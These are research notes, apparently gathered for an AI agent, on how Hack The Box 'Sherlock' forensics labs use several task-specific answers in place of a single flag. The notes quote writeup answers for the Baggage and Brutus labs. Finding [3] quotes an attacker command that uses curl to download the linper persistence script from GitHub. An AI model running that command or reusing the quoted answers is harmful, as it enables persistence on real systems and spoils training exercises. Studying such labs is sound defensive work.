# F2: Sherlock multi-flag structure

## Findings

### [1] HTB Sherlocks are blue-team investigation labs with multi-task flag counts, typically 8–10 free-form answers per challenge, not a single HTB{} string.
Quote: "Introducing Sherlocks: a dedicated category of blue team labs on digital forensics and incident response." … "With Sherlocks, you will be asked to dive into the aftermath of a targeted cyber attack and unravel its intricate dynamics using the clues at your discretion."
url: https://www.hackthebox.com/hacker/blue-team-labs-for-dfir
source_type: official HTB product page
published: n.d. (live as of 2026-09-17)
confidence: high

### [2] Public Sherlock writeups show numbered Task questions with evidence-derived answers (not banner flags). Baggage has 10 tasks; answers are paths, names, timestamps, UNC paths.
Quote: "### Task 1 - What was the name of the archive file downloaded by the compromised account? … ```1.zip```" … "### Task 10 - The attacker compressed the staging folder to prepare the data for exfiltration. When was the exfiltration archive file accessed? … ```2025-09-03 07:34:30```"
url: https://raw.githubusercontent.com/FOLKS-iwd/htb-writeups/main/sherlocks/baggage/README.md
source_type: community GitHub writeup
published: 2026-08-13 (challenge release noted in writeup)
confidence: high

### [3] Another public Sherlock (Brutus) also uses multi-task Q&A: 8 tasks; answers include attacker IP, username, timestamp, session number, MITRE ID, full sudo command. Questions are restated in writeups as the challenge text players saw.
Quote: "## Task 1 Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?" … "答案：`65.2.161.68`" … "## Task 8 … What is the full command executed using sudo?" … "答案：`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`"
url: https://raw.githubusercontent.com/h0ny/HackTheBox-Sherlocks-Writeups/main/digital-forensics-and-incident-response/dfir/brutus.md
source_type: community GitHub writeup
published: ~2024 (writeup repo; challenge ~Mar 2024)
confidence: high

### [4] Flag strings live in challenge evidence artifacts, not as pre-printed HTB{...} banners in the writeups. Baggage evidence = KAPE registry hives (NTUSER.DAT, UsrClass.dat shellbags); Brutus evidence = auth.log + wtmp. Answers are extracted values matching each task prompt.
Quote: "The KAPE collection (`Baggage.zip`, password: `hacktheblue`) contains registry hives from two user profiles and the system default" … "- /var/log/auth.log 是用于记录认证（authentication）相关事件的日志文件" … "- /var/log/wtmp 是一个二进制文件，可以使用 utmpdump 进行查看"
url: https://raw.githubusercontent.com/FOLKS-iwd/htb-writeups/main/sherlocks/baggage/README.md ; https://raw.githubusercontent.com/h0ny/HackTheBox-Sherlocks-Writeups/main/digital-forensics-and-incident-response/dfir/brutus.md
source_type: community GitHub writeups
published: 2026-08-13 / ~2024
confidence: high

### [7] Common mistake (inferred from writeup structure): inventing flags from every interesting IOC. Public writeups submit only the value that answers the named task—e.g. Baggage Task 5 is the UNC path `\\Prod-ns-2\prodshare`, not a file hash; Brutus Task 6 is MITRE ID `T1136.001`, not the attacker IP again. Each of 8–10 flags maps 1:1 to a distinct question answer; IOCs that are not the asked-for value are not flags.
Quote: "### Task 5 - The attacker also accessed a network share to pillage network data. What is the UNC path? ```\\Prod-ns-2\prodshare```" … "## Task 6 What is the MITRE ATT&CK sub-technique ID used for persistence? … 答案：`T1136.001`"
url: https://raw.githubusercontent.com/FOLKS-iwd/htb-writeups/main/sherlocks/baggage/README.md ; https://raw.githubusercontent.com/h0ny/HackTheBox-Sherlocks-Writeups/main/digital-forensics-and-incident-response/dfir/brutus.md
source_type: community GitHub writeups (pattern inference)
published: 2026-08-13 / ~2024
confidence: medium (pattern solid for platform Sherlocks; no writeup explicitly warns "do not invent flags"; Holmes event UI still unobserved)
